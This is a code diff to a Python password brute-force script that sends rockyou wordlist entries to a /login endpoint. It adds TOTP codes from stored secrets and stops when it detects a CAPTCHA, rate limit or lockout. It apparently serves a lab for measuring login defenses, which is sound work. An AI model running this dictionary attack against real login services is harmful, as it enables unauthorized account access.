@@ -4,6 +4,7 @@ import time
 import json
 import os
 import sys
+import pyotp
 from datetime import datetime
 
 BASE_DIR = os.path.dirname(os.path.dirname(__file__))
@@ -14,7 +15,6 @@ WORDLIST_PATH = os.path.join(BASE_DIR, "data", "rockyou.txt")
 
 def load_wordlist(limit=50000):
     with open(WORDLIST_PATH, "r", encoding="latin-1") as f:
-        # read lines, strip newline, take first N entries
         return [line.strip() for line in f if line.strip()][:limit]
 
 def load_users():
@@ -29,19 +29,51 @@ def brute_force(username):
         return
 
     hash_mode = target.get("hash_mode", "sha256")
-
     PASSWORD_LIST = load_wordlist()
+
     for candidate in PASSWORD_LIST:
         start = time.time()
-        resp = requests.post(f"{BASE_URL}/login", json={
-            "username": username,
-            "password": candidate
-        })
+        if target.get("totp_secret"):
+        # for strong users use /login_totp and include a TOTP code
+            code = pyotp.TOTP(target["totp_secret"]).now()
+            resp = requests.post(f"{BASE_URL}/login_totp", json={
+                "username": username,
+                "password": candidate,
+                "totp": code
+            })
+        else:
+            # for weak/medium users we do a normal login
+            resp = requests.post(f"{BASE_URL}/login", json={
+                "username": username,
+                "password": candidate
+            })
         latency_ms = int((time.time() - start) * 1000)
+
+        if resp.status_code == 403 and "captcha_required" in resp.text:
+            print(f"[CAPTCHA] {username} blocked, stopping brute force.")
+            return
+
+        if resp.status_code == 429:
+            print("[RATE LIMIT] Global block triggered, stopping brute force.")
+            return
+        
+        if resp.status_code == 403 and "Account locked" in resp.text:
+            print(f"[LOCKOUT] {username} locked, stopping attempts for this user.")
+            return
 
         if resp.status_code == 200:
             result = "SUCCESS"
             print(f"[SUCCESS] {username} cracked with '{candidate}' (latency {latency_ms} ms)")
+            entry = {
+                "timestamp": datetime.now().isoformat(),
+                "username": username,
+                "hash_mode": hash_mode,
+                "result": result,
+                "latency_ms": latency_ms
+            }
+            with open(LOG_FILE, "a") as f:
+                f.write(json.dumps(entry) + "\n")
+            return  
         else:
             result = "FAILED"
             print(f"[FAILED] {username} with '{candidate}' (latency {latency_ms} ms)")
@@ -55,9 +87,6 @@ def brute_force(username):
         }
         with open(LOG_FILE, "a") as f:
             f.write(json.dumps(entry) + "\n")
-
-        if result == "SUCCESS":
-            return
 
     print(f"[INFO] Exhausted list, no success for {username}")
 
